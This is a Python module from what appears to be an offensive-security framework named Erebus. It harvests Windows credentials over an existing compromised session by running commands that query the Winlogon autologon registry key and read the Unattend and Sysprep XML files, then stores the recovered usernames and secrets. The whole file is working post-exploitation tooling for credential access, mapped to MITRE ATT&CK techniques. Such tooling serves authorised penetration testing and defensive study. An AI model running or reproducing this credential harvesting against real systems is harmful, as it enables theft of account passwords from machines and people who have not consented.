"""Harvest credentials the controlled user can already read on a Windows session.

Read-only: reads Winlogon autologon registry values and unattend/sysprep files
and records what it finds in the credential store. It never cracks, escalates,
or transmits secrets - values are stored locally and redacted over the API.
"""
from __future__ import annotations

from erebus.core.module_base import OptionSpec, Post, Rank
from erebus.modules.post import _creds

_HARVEST = [
    ("autologon",
     'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" 2>nul',
     _creds.parse_win_autologon),
    ("unattend",
     "type C:\\Windows\\Panther\\Unattend.xml 2>nul & "
     "type C:\\Windows\\Panther\\Unattend\\Unattend.xml 2>nul & "
     "type C:\\Windows\\System32\\Sysprep\\unattend.xml 2>nul",
     _creds.parse_unattend),
]


class WindowsCreds(Post):
    name = "windows_creds"
    description = ("Harvest readable credentials on an existing Windows session "
                   "(autologon, unattend)")
    authors = ["Erebus"]
    references = ["https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation"]
    attack = ["T1552.001", "T1552.002", "T1555"]
    rank = Rank.NORMAL
    options = [
        OptionSpec("SESSION", required=True, kind="int",
                   desc="id of a live Windows session to harvest (see /sessions)"),
    ]

    def run(self) -> None:
        sess = self.get_session()
        if sess is None:
            return
        host = sess.host
        self.info_(f"harvesting readable credentials on session {sess.id} @ {host}")
        total = 0
        for label, cmd, parser in _HARVEST:
            try:
                out = sess.command(cmd, overall=10.0)
            except OSError as exc:
                self.warn(f"{label}: session read failed ({exc})")
                continue
            for cred in parser(out):
                total += 1
                self.add_credential(
                    host, cred.get("username", ""), secret=cred.get("secret", ""),
                    kind=cred.get("kind", "password"), service=cred.get("service", ""))
                self.add_finding(
                    host, f"Credential recovered: {cred.get('service', '')} "
                    f"({cred.get('username') or 'n/a'})",
                    severity="high", attack="T1552", evidence_ref=f"session:{sess.id}")
                self.good(f"{label}: {cred.get('service')} {cred.get('username') or '(no user)'}")
        if total == 0:
            self.info_("no readable credentials found with the current access")
        else:
            self.good(f"done: {total} credential(s) stored - see the Creds tab / /credentials")
